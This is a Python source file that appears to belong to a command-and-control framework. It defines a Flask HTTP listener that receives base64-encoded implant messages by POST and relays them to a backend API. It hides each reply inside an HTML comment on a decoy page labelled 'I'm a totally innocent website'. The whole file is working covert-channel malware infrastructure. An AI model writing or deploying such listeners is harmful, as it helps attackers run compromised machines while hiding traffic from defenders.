from flask import Flask, request
from base64 import b64decode, b64encode

from malon_lp.listener import Listener
from malon_lp.listener.handler.dummy_auth import DummyAuthHandler
from malon_lp.listener.handler.api import ApiHandler

from malon_lp.crypto.dh import KeyExchange

class UnencryptedHttpListener(Listener):
    def __init__(self, api_url: str, listener_id: int, host: str, port: int):
        handler = ApiHandler(api_url, listener_id)
        handler = DummyAuthHandler(handler)

        self._handler = handler
        self._host = host
        self._port = port
    
    @classmethod
    def new(cls, api_url: str, listener_id: int, host: str, port: int, _sym_key: bytes) -> 'Listener':
        return cls(api_url, listener_id, host, port)
    
    @classmethod
    def type_name(cls) -> str:
        return 'unenc-http'
    
    def run(self):
        # A implementar
        app = Flask(__name__)

        @app.route('/', methods=["POST"])
        def root():
            msg = b64decode(request.form['m'])
            response_msg = self._handler.handle_msg(msg)
            return """
        <html>
            <head><!--{}--></head>
            <body>I'm a totally innocent website</body>
        </html>
            """.format(b64encode(response_msg).decode('utf-8'))

        app.run(host=self._host, port=self._port)

